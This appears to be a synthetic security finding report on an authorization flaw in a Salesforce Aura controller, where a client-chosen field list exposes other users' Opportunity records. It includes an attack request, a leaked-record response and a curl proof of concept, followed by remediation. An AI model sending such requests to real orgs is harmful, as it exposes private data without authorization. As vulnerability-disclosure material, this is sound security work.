# Security Analysis Report
**System:** TraceOrigin Supply API (Salesforce-Integrated)
**Domain:** Food & Beverage / FMCG
**Example ID:** SF-0079
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `OpportunityController.getOpportunity` — attacker reads any FMCG Opportunity record including all custom fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Opportunity Object (Pattern 1.12)

### Summary
The Apex controller `OpportunityController` on TraceOrigin Supply API (`280f1df9.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 1.12, the client-supplied `fields` array allows mass-reading all object attributes including `SensitiveData__c` and `InternalNotes__c` without server-side restriction.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` while the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://280f1df9.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://280f1df9.lightning.force.com/aura
Authorization: Bearer 00D280F1DF9!AR280f1df9...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D280F1DF9!AR280f1df9...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"0011DF9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0011DF9", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-30-7871"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D280F1DF9!AR280f1df9..."
curl -s -X POST "https://280f1df9.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0011DF9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-30-7871
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist (prevent mass-read of all custom fields). Validate `aura.token`.
